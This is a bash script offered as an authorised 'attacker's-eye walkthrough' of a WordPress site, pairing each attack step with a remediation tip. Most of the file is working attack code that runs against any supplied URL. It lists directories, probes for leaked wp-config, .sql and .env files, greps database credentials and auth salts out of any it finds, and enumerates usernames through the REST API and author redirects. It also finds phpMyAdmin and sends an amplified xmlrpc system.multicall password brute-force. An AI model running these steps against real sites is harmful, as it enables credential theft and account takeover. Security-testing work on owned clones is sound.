#!/usr/bin/env bash
# attack_walk.sh — attacker's-eye walkthrough of exposed_listings + login_surfaces.
#
# AUTHORISED USE ONLY. Run against a CLONE or an asset you own. The --loud steps
# send real brute-force / download traffic and can lock accounts on a live box —
# that is why they are off by default.
#
# Usage:
#   ./attack_walk.sh https://clone.example.com          # read-only recon (safe)
#   ./attack_walk.sh https://clone.example.com --loud   # + noisy/exploit steps
#
# Every step prints its OBJECTIVE (what the attacker is trying to achieve), runs
# the exact request, interprets the result, and ends with the FIX.

set -uo pipefail

TARGET="${1:-}"
LOUD="${2:-}"
[ -z "$TARGET" ] && { echo "usage: $0 <url|host> [--loud]"; exit 1; }
[[ "$TARGET" != http* ]] && TARGET="https://$TARGET"
B="${TARGET%/}"                                  # base, no trailing slash
CURL=(curl -sk --max-time 15 -A "Mozilla/5.0 (attack_walk)")   # -k: clone may be self-signed

hr(){ printf '\n\033[1m━━━ %s ━━━\033[0m\n' "$1"; }
obj(){ printf '  OBJECTIVE: %s\n' "$1"; }
why(){ printf '  WHY      : %s\n' "$1"; }
fix(){ printf '  \033[32mFIX      : %s\033[0m\n' "$1"; }
hit(){ printf '  \033[31m[HIT]\033[0m %s\n' "$1"; }
ok(){  printf '  [ok]  %s\n' "$1"; }

code(){ "${CURL[@]}" -o /dev/null -w '%{http_code}' "$1"; }   # HTTP status of a URL

echo "Target: $B   (loud=${LOUD:-no})"

############################################################################
hr "PHASE A — exposed_listings  (the server leaking raw files)"
############################################################################

# ---- A1: directory listings -------------------------------------------------
hr "A1. Directory-listing sweep"
obj "Find a folder the web server will happily list, so I can browse your filesystem over HTTP."
why "'Index of /' appears when a directory has no index file AND autoindex is on (misconfig)."
for d in / /wp-content/ /wp-content/uploads/ /wp-includes/ /wp-content/upgrade/ \
         /backup/ /backups/ /wp-snapshots/ /old/ /tmp/ ; do
  if "${CURL[@]}" "$B$d" | grep -qi "index of"; then
    hit "$B$d  → directory listing EXPOSED"
  else
    ok "$B$d"
  fi
done
fix "Apache: 'Options -Indexes'   nginx: 'autoindex off;'  (and don't rely on empty index.html)."

# ---- A2: backup / leftover files -------------------------------------------
hr "A2. Backup & leftover-file probe"
obj "Locate a backup/dump/config file left in the webroot — that is where plaintext DB creds live."
why "A single readable wp-config.php.bak or .sql = credentials without any exploit."
FOUND_SECRET=""
for f in wp-config.php.bak wp-config.php.save wp-config.php.old "wp-config.php~" \
         wp-config.php.txt wp-config.old .env database.sql db.sql dump.sql \
         backup.zip backup.tar.gz site.zip .git/config wp-content/debug.log ; do
  c=$(code "$B/$f")
  if [ "$c" = "200" ]; then
    hit "$B/$f  → HTTP 200 (readable)"
    case "$f" in *config*|*.sql|*.env) FOUND_SECRET="$B/$f" ;; esac
  else
    ok "$f ($c)"
  fi
done
fix "Move backups OUT of the webroot; deny .bak/.sql/.old/.env/.git at the server; rotate any creds already exposed."

# ---- A3: pull the loot (loud) ----------------------------------------------
if [ "$LOUD" = "--loud" ] && [ -n "$FOUND_SECRET" ]; then
  hr "A3. Extract credentials from the leaked file  [LOUD]"
  obj "Prove the leak is game-over by reading the DB credentials straight out of the file."
  why "With DB creds an attacker connects directly, or forges login cookies from the AUTH salts."
  "${CURL[@]}" "$FOUND_SECRET" | grep -Ei "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY|AUTH_SALT" \
    | sed 's/^/    LEAKED > /' || echo "    (no obvious creds in $FOUND_SECRET)"
  fix "This file must not exist in the webroot. Its presence = immediate credential compromise."
elif [ -n "$FOUND_SECRET" ]; then
  printf '\n  (skipping credential extraction from %s — run with --loud to prove it)\n' "$FOUND_SECRET"
fi

############################################################################
hr "PHASE B — login_surfaces  (side doors: xmlrpc + phpMyAdmin + name leaks)"
############################################################################

# ---- B1: xmlrpc alive -------------------------------------------------------
hr "B1. Is xmlrpc.php answering?"
obj "Confirm the XML-RPC endpoint is live — it is a brute-force amplifier and an SSRF/DDoS lever."
why "A GET returns 'XML-RPC server accepts POST requests only' when it's enabled."
XMLRPC_MSG=$("${CURL[@]}" "$B/xmlrpc.php")
if echo "$XMLRPC_MSG" | grep -qi "XML-RPC server accepts POST"; then
  hit "xmlrpc.php is ENABLED"
else
  ok "xmlrpc.php not obviously enabled"
fi

# ---- B2: which xmlrpc methods (multicall / pingback) -----------------------
hr "B2. Enumerate xmlrpc methods"
obj "See if system.multicall (mass brute) and pingback.ping (SSRF/DDoS) are available."
why "system.multicall lets ONE request test hundreds of passwords, dodging simple rate limits."
"${CURL[@]}" -H 'Content-Type: text/xml' \
  --data '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' \
  "$B/xmlrpc.php" | grep -oiE "system.multicall|pingback.ping|wp.getUsersBlogs" | sort -u \
  | sed 's/^/    method available > /' || true
fix "Block xmlrpc.php at the server unless Jetpack/mobile truly need it; if needed, disable pingback + rate-limit."

# ---- B3: username enumeration ----------------------------------------------
hr "B3. Username enumeration"
obj "Learn real admin login names, turning blind brute-force into targeted brute-force."
why "WP leaks usernames via the REST API and author archives by default."
USERS=$("${CURL[@]}" "$B/wp-json/wp/v2/users" | grep -oE '"slug":"[^"]+"' | cut -d'"' -f4 | sort -u)
if [ -n "$USERS" ]; then
  hit "wp-json leaked users: $(echo "$USERS" | tr '\n' ' ')"
else
  ok "wp-json/wp/v2/users not leaking"
fi
LOC=$("${CURL[@]}" -I "$B/?author=1" | grep -i "^location:" | grep -oE "author/[^/[:space:]]+")
[ -n "$LOC" ] && hit "?author=1 redirect leaks login: ${LOC#author/}" || ok "?author=1 not leaking"
fix "Block ?author= redirects and restrict/deny /wp-json/wp/v2/users to unauthenticated callers."

# ---- B4: phpMyAdmin exposed -------------------------------------------------
hr "B4. Exposed database UI"
obj "Find a web DB console (phpMyAdmin/Adminer) — a direct GUI into the database."
why "If reachable, weak/leaked creds = full read/write on the DB, no WordPress needed."
for p in phpmyadmin pma dbadmin adminer mysql _phpmyadmin; do
  c=$(code "$B/$p/")
  [ "$c" = "200" ] && hit "$B/$p/  → HTTP 200 (DB UI exposed)" || ok "$p/ ($c)"
done
fix "Never expose DB UIs to the internet: bind to localhost + SSH-tunnel, or IP-allowlist."

# ---- B5: multicall brute demo (loud) ---------------------------------------
if [ "$LOUD" = "--loud" ]; then
  hr "B5. Amplified brute-force via system.multicall  [LOUD]"
  U=$(echo "$USERS" | head -1); U=${U:-admin}
  obj "Show how ONE xmlrpc request tests many passwords against '$U' — the actual attack."
  why "Each <methodCall> inside a multicall is a full login attempt; the server checks them all in one shot."
  PWS=(admin password Password1 admin123 123456 letmein welcome1 wordpress)
  CALLS=""; for p in "${PWS[@]}"; do
    CALLS+="<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><array><data><value><string>$U</string></value><value><string>$p</string></value></data></array></value></param></params></methodCall>"
  done
  # Fire one multicall wrapping all the per-password login attempts.
  RESP=$("${CURL[@]}" -H 'Content-Type: text/xml' \
    --data "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>${CALLS}</data></array></value></param></params></methodCall>" \
    "$B/xmlrpc.php")
  if echo "$RESP" | grep -qi "isAdmin\|<name>url</name>\|usersblogs"; then
    hit "A password in the set AUTHENTICATED for '$U' — check the response for the winning cred."
    echo "$RESP" | grep -oiE "isAdmin|blogName|<string>https?://[^<]+" | head | sed 's/^/    /'
  elif echo "$RESP" | grep -qi "faultString"; then
    ok "All ${#PWS[@]} passwords rejected in ONE request (faultCode 403). Point made: no rate-limit tripped."
  else
    ok "multicall may be disabled (good) — response carried no per-call results."
  fi
  fix "Disable xmlrpc or pingback/multicall; enforce strong admin passwords + 2FA + a login-attempt limiter."
else
  printf '\n  (skipping B5 amplified brute demo — run with --loud on the clone to watch it work)\n'
fi

hr "DONE — remediation summary"
cat <<'EOF'
  exposed_listings : Options -Indexes / autoindex off; backups out of webroot; deny .bak/.sql/.env/.git; rotate leaked creds.
  login_surfaces   : block/limit xmlrpc.php; kill username enumeration; take phpMyAdmin off the internet; strong passwords + 2FA.
  The single highest-value fix: get any leaked wp-config/.sql backup out of the webroot — that one file is 'game over' by itself.
EOF
